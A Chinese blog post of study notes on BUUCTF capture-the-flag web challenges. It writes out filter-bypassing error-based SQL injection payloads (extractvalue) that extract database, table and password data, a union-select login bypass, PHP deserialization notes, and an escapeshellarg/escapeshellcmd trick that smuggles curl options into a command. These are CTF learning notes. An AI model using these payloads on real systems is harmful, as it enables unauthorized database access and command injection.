---
title: buu知识点复习(三)
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg'
authorAbout: steamID：888007034
authorDesc: 'Blizzard：TroyeSivan#51769'
categories: 技术
comments: true
date: 2020-08-31 10:08:05
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1098462.jpg
---
一、[强网杯 2019]高明的黑客--python多线程脚本
多线程脚本现在对我来说还是比较困难。估计模仿着勉强能写出来。
唯一的问题就是看到有些奇怪的正则表达式还是不知道啥意思，主要是格式要记住。

正则表达式符号大全：https://www.cnblogs.com/yirlin/archive/2006/04/12/373222.html
单线程脚本：https://www.cnblogs.com/xhds/p/12289768.html
多线程脚本：https://www.cnblogs.com/h3zh1/p/12661892.html
单线程写出来应该没什么问题，但是本题如果单线程估计要跑到心态爆炸。

二、[极客大挑战 2019]HardSQL--报错注入
首先来重新学习一下报错注入。

报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数。

报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。

1、xpath语法错误
利用xpath语法错误来进行报错注入主要利用extractvalue和updatexml两个函数。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200901004949.png)

0x7e=’~’
‘~‘可以换成’#’、’$'等不满足xpath格式的字符
extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位
这道题就是用的这种方法，两种都写一下：
extractvalue：
库：username=44&password=1'^extractvalue(1,concat(0x7e,(select(database()))))%23

表：username=44&password=1'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables))))%23

列：username=44&password=1'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('geek')))))%23 
这里用like代替=号，因为被过滤了。

username=44&password=1'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1')))))%23

这里限制了回显位数，且substr被过滤了，要用到另外一个骚操作{left(),right()}
playload:username=44&password=1%27^extractvalue(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1))))%23


updatexml：
类似

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/976.jpg)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/6436347.jpg)

2、concat+rand()+group_by()导致主键重复
还没遇到过，后面再说吧。

三、[GXYCTF2019]BabySQli--sql注入
当查询的数据不存在的时候，联合查询就会构造一个虚拟的数据。
username栏：'union select 1,admin','e10adc3949ba59abbe56e057f20f883e'#
password栏：123456

四、[网鼎杯 2020 青龙组]AreUSerialz--反序列化
一个非常简单的反序列化，魔法函数的调用条件要记住。

__construct()当一个对象创建时被调用
__destruct()当一个对象销毁时被调用
__toString()当一个对象被当作一个字符串使用
__sleep() 在对象在被序列化之前运行
__wakeup将在序列化之后立即被调用

五、[BUUCTF 2018]Online Tool--PHP escapeshellarg()+escapeshellcmd()
https://paper.seebug.org/164/
1、传入的参数是：172.17.0.2' -v -d a=1
2、经过escapeshellarg处理后变成了'172.17.0.2'\'' -v -d a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。
3、经过escapeshellcmd处理后变成'172.17.0.2'\\'' -v -d a=1\'，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php
4、最后执行的命令是curl '172.17.0.2'\\'' -v -d a=1\'，由于中间的\\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1'，即向172.17.0.2\发起请求，POST 数据为a=1'。






     

